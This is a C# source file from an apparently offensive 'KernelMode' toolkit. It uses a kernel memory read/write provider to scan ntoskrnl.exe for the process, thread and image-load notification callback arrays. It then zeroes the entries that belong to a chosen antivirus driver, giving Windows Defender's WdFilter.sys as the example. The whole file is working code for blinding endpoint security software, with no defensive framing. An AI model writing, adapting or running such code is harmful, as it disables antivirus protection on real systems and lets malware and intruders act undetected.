using KernelMode.Driver;
using KernelMode.Providers;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace KernelMode.Utils
{
    public static class AvCallbackUnlinker
    {
        // Signatures to find kernel callback arrays in ntoskrnl.exe
        private static readonly byte[] PspCreateProcessNotifyRoutineSig = { 0x48, 0x8d, 0x0d, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x84, 0xc0, 0x74, 0x50 };
        private static readonly byte[] PspCreateThreadNotifyRoutineSig = { 0x48, 0x8d, 0x0d, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x8b };
        private static readonly byte[] PspLoadImageNotifyRoutineSig = { 0x48, 0x8d, 0x0d, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xf2, 0x4c, 0x8b, 0xe9, 0x48, 0x8b, 0xd6 };

        public static void UnlinkAVCallbacks()
        {
            var provider = KernelMemory.GetProvider();
            if (provider == null)
            {
                Console.WriteLine("[-] No active provider. Cannot unlink AV callbacks.");
                return;
            }

            Console.Write("Enter the name of the driver to target (e.g., WdFilter.sys): ");
            string targetDriver = Console.ReadLine();
            if (string.IsNullOrWhiteSpace(targetDriver))
            {
                Console.WriteLine("[-] Invalid driver name.");
                return;
            }

            Console.WriteLine("[*] Unlinking callbacks for: " + targetDriver);

            var ntoskrnl = GetKernelModule("ntoskrnl.exe");
            if (ntoskrnl.ImageBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get ntoskrnl module base.");
                return;
            }

            byte[] ntoskrnlImage = new byte[ntoskrnl.ImageSize];
            if (!provider.ReadMemory((ulong)ntoskrnl.ImageBase, ntoskrnlImage, ntoskrnlImage.Length))
            {
                Console.WriteLine("[-] Failed to read ntoskrnl.exe from kernel memory.");
                return;
            }

            // Unlink Process, Thread, and Image Load callbacks
            UnlinkCallback(provider, ntoskrnlImage, (ulong)ntoskrnl.ImageBase, PspCreateProcessNotifyRoutineSig, targetDriver, "Process Creation");
            UnlinkCallback(provider, ntoskrnlImage, (ulong)ntoskrnl.ImageBase, PspCreateThreadNotifyRoutineSig, targetDriver, "Thread Creation");
            UnlinkCallback(provider, ntoskrnlImage, (ulong)ntoskrnl.ImageBase, PspLoadImageNotifyRoutineSig, targetDriver, "Image Load");

            Console.WriteLine("[+] Callback unlinking complete.");
        }

        private static void UnlinkCallback(IProvider provider, byte[] ntoskrnlImage, ulong ntoskrnlBase, byte[] signature, string targetDriver, string callbackType)
        {
            ulong callbackArrayAddr = FindSignature(ntoskrnlImage, ntoskrnlBase, signature);
            if (callbackArrayAddr == 0)
            {
                Console.WriteLine($"[-] Could not find {callbackType} callback array.");
                return;
            }

            Console.WriteLine($"[*] {callbackType} callback array found at: 0x{callbackArrayAddr:X}");

            for (int i = 0; i < 64; i++) // Max 64 callbacks
            {
                ulong entryPtr = callbackArrayAddr + (ulong)(i * 8);
                byte[] entryBytes = new byte[8];
                if (!provider.ReadMemory(entryPtr, entryBytes, 8)) continue;
                ulong entry = BitConverter.ToUInt64(entryBytes, 0);
                if (entry == 0) continue;

                // The actual callback pointer is masked.
                ulong callbackAddr = entry & ~0xFUL;
                if (callbackAddr == 0) continue;

                var module = GetModuleForAddress(callbackAddr);
                if (module.ImageBase != IntPtr.Zero && Encoding.ASCII.GetString(module.FullPathName).ToLowerInvariant().Contains(targetDriver.ToLowerInvariant()))
                {
                    Console.WriteLine($"[+] Found {targetDriver} {callbackType} callback at 0x{callbackAddr:X}. Unlinking...");
                    if (provider.WriteMemory(entryPtr, new byte[8], 8)) // Zero out the entry
                    {
                        Console.WriteLine("[+] Callback unlinked successfully.");
                    }
                    else
                    {
                        Console.WriteLine("[-] Failed to unlink callback.");
                    }
                }
            }
        }

        private static ulong FindSignature(byte[] image, ulong imageBase, byte[] signature)
        {
            for (int i = 0; i < image.Length - signature.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < signature.Length; j++)
                {
                    if (signature[j] != 0x00 && image[i + j] != signature[j])
                    {
                        found = false;
                        break;
                    }
                }

                if (found)
                {
                    int relativeOffset = BitConverter.ToInt32(image, i + 3);
                    ulong instructionAddress = imageBase + (ulong)i;
                    return instructionAddress + 7 + (ulong)relativeOffset;
                }
            }
            return 0;
        }

        private static DriverLoader.SYSTEM_MODULE_INFORMATION GetModuleForAddress(ulong address)
        {
            if (!DriverLoader.TryQuerySystemModules(out var buffer, out var count, out var entrySize))
                return new DriverLoader.SYSTEM_MODULE_INFORMATION();

            try
            {
                IntPtr current = new IntPtr(buffer.ToInt64() + 4);
                for (int i = 0; i < count; i++)
                {
                    var entry = Marshal.PtrToStructure<DriverLoader.SYSTEM_MODULE_INFORMATION>(current);
                    ulong start = (ulong)entry.ImageBase;
                    ulong end = start + entry.ImageSize;
                    if (address >= start && address < end)
                    {
                        return entry;
                    }
                    current = new IntPtr(current.ToInt64() + entrySize);
                }
            }
            finally
            {
                if (buffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(buffer);
            }

            return new DriverLoader.SYSTEM_MODULE_INFORMATION();
        }

        private static DriverLoader.SYSTEM_MODULE_INFORMATION GetKernelModule(string moduleName)
        {
            if (!DriverLoader.TryQuerySystemModules(out var buffer, out var count, out var entrySize))
                return new DriverLoader.SYSTEM_MODULE_INFORMATION();

            try
            {
                IntPtr current = new IntPtr(buffer.ToInt64() + 4);
                for (int i = 0; i < count; i++)
                {
                    var entry = Marshal.PtrToStructure<DriverLoader.SYSTEM_MODULE_INFORMATION>(current);
                    string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0').ToLowerInvariant();
                    if (name.EndsWith($"\\{moduleName}") || name.EndsWith($"/{moduleName}") || name.Contains(moduleName))
                    {
                        return entry;
                    }
                    current = new IntPtr(current.ToInt64() + entrySize);
                }
            }
            finally
            {
                if (buffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(buffer);
            }

            return new DriverLoader.SYSTEM_MODULE_INFORMATION();
        }
    }
}
